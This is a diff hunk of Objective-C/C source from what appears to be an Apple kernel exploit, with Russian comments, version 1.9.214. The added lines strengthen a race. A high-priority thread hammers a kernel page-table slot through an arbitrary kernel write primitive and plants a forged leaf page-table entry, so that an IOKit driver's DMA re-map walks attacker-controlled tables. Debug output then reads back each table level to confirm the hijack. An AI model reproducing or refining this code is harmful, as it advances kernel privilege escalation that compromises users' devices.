@@ -7817,8 +7817,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         __block volatile BOOL stopRace = NO;
                         __block volatile uint64_t raceSlot = l0slot;
                         __block volatile uint64_t raceVal = (L1PA >> 4) | 1;
+                        // 1.9.214: дожим ДВУХ слотов — драйвер на re-map идёт по НАШЕЙ
+                        // ветке (L0[0] валиден → уровень есть) и затирает L3[0]
+                        // настоящим PTE. Молотим и L0[0], и L3[leaf] всё окно.
+                        __block volatile uint64_t raceLeaf = (uint64_t)(L3p + (uint64_t)ig[3] * 8);
+                        __block volatile uint64_t raceLeafVal = ctl2PA | linkFlags;
                         dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-                            while (!stopRace) { early_kwrite64(raceSlot, raceVal); usleep(50); }
+                            while (!stopRace) {
+                                early_kwrite64(raceSlot, raceVal);              // L0[0] в ядре — kwrite
+                                *(volatile uint64_t *)raceLeaf = raceLeafVal;   // L3[leaf] в НАШЕЙ памяти — прямой стор
+                                usleep(50);
+                            }
                         });
                         uint8_t tsdG[0x1B0];
                         memcpy(tsdG, tsdV, sizeof(tsdG));
@@ -7829,6 +7838,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         kpNote(r, [NSString stringWithFormat:@"  [P7] graft-submit kr=0x%x — жду DMA по нашей ветке", gkr]);
                         usleep(400000);
                         stopRace = YES;
+                        // 1.9.214: readback всех уровней ПОСЛЕ окна — доказательство,
+                        // ходил ли драйвер по нашей ветке (L1/L2 сохранились, L3 затёрт?)
+                        kpNote(r, [NSString stringWithFormat:@"  [P7] post: L0[0]=%#018llx L1[%u]=%#018llx L2[%u]=%#018llx L3[%u]=%#018llx",
+                              (unsigned long long)early_kread64(l0slot), ig[1], *(volatile uint64_t *)(L1p + (uint64_t)ig[1] * 8),
+                              ig[2], *(volatile uint64_t *)(L2p + (uint64_t)ig[2] * 8),
+                              ig[3], *(volatile uint64_t *)(L3p + (uint64_t)ig[3] * 8)]);
                         int ch2 = 0;
                         for (uint32_t i = 0; i < 0x4000; i += 4) {
                             uint32_t px = *(volatile uint32_t *)(ctl2 + i);
